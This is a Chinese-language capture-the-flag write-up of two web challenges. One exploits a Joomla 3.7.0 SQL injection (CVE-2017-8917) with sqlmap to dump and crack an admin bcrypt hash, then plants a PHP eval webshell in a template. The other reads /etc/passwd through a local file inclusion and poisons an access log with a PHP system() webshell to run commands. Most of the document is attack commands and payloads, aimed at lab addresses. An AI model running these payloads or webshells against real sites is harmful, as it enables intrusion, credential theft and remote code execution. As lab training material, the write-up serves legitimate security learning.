![alt text](images/image-9.png)

得到/README.txt，访问发现版本是Joomla_3.7
![alt text](images/image-10.png)

搜索该版本漏洞
```
searchsploit Joomla 3.7
```
![alt text](images/image-11.png)

查看42033.txt
```
searchsploit -m 42033
cat 42033.txt

# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)    
```

根据提示，用sqlmap
```
sqlmap -u "http://175.27.169.122:37315/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
发现存在SQL注入，包含数据库joomladb
![alt text](images/image-12.png)

列出joomladb的tables：#__users
```
sqlmap -u "http://175.27.169.122:37315/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb --tables
```
![alt text](images/image-13.png)

列出列名，提示无法获取，需要爆破：name, email, id, username, password
```
sqlmap -u "http://175.27.169.122:37315/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T "#__users" --columns
```
![alt text](images/image-14.png)

列出#__users表的账号和密码
```
sqlmap -u "http://175.27.169.122:37315/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T "#__users" -C "username,password" --dump
```

得到用户名/密码哈希：`ducktail/$2y$10$MCjy/AHhuU1LmHMlaALVUeUhBDLIxnLI5al9JO8gvSoH0PPcRjwna`
![alt text](image-15.png)
- `$2y`表示bcrypt哈希，`$10`表示cost=10（标准强度）

将密码哈希单独保存为文件hash.txt，用hashcat爆破（mode = 3200表示bcrypt，攻击模式-a = 0表示字典攻击）
```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

爆破出密码为electric
![alt text](images/image-16.png)

用ducktail/electric登陆后台http://175.27.169.122:63365/administrator/ ，在template中修改protostar（default for all pages），将/index.php覆盖为webshell。
```php
<?php
@eval($_POST['pass']);
?>
```
蚁剑连接：http://175.27.169.122:63365/index.php （密码pass）

在`/home/www-data/flag`下找到flag
```
flag{7738769e-64df-486d-8361-05c90220fc47}
```
![alt text](images/image-17.png)

### 11. 遗忘的调试信息
提示：情报显示，某敌对势力的Web系统正在开发中。我们的特工在夜间潜入机房，发现系统首页还是默认状态，但开发者似乎留下了调试入口。 你的任务是找到并利用这些疏忽，渗透进系统获取最高权限，窃取其核心机密（flag）。

dirb扫描目录
```
dirb http://175.27.169.122:23532  
```
发现antibot_image
![alt text](image-18.png)

访问antibot_image/antibots目录，下载查看文件，发现info.php
```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<!-- </?php include $_GET['image']; -->

</body>
</html>


<?php
phpinfo();
include $_GET['image'];
```
这个文件包含是直接include，如果参数为纯文本文件会正常显示；但如果包含一个php文件或者日志文件里有php代码，会把PHP代码当作PHP执行而不是显示。

尝试读取系统文件：
```
/antibot_image/antibots/info.php?image=../../../../../../../etc/passwd
```
![alt text](images/image-19.png)

检查发现通过/antibot_image/界面访问记录的日志都记录到了/antibot_image/log/
```
[2026-02-06 03:45:59] IP:10.42.4.0 | DIR:/var/www/html/antibot_image | URI:/antibot_image/ | REF:direct | UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
[2026-02-06 03:46:01] IP:10.42.4.0 | DIR:/var/www/html/antibot_image/antibots | URI:/antibot_image/?dir=antibots | REF:http://175.27.169.122:45439/antibot_image/ | UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
[2026-02-06 03:46:24] IP:10.42.4.0 | DIR:/var/www/html/antibot_image | URI:/antibot_image/ | REF:direct | UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
[2026-02-06 03:46:26] IP:10.42.4.0 | DIR:/var/www/html/antibot_image/log | URI:/antibot_image/?dir=log | REF:http://175.27.169.122:45439/antibot_image/ | UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
```

分析可知：
- 日志格式为`[时间] IP | DIR:真实服务器目录 | URI:你访问的路径 | REF | UA`
- 真实路径为`/var/www/html/antibot_image/`
  
因此需要将最后的UA改为一句话webshell
```php
<?php system($_GET['cmd']);?>
```
![alt text](images/image-20.png)

访问并触发命令执行，在response中得到回显
```
GET /antibot_image/antibots/info.php?image=/var/www/html/antibot_image/log/2026-02-06-access.log&cmd=id
```
![alt text](images/image-21.png)

在`/home/www-data/flag`中获得flag：`flag{4f78b4d0-cd23-41c3-8c81-2b99c1c721c2}`
```
GET /antibot_image/antibots/info.php?image=/var/www/html/antibot_image/log/2026-02-06-access.log&cmd=cat+/home/www-data/flag
```
![alt text](images/image-22.png)

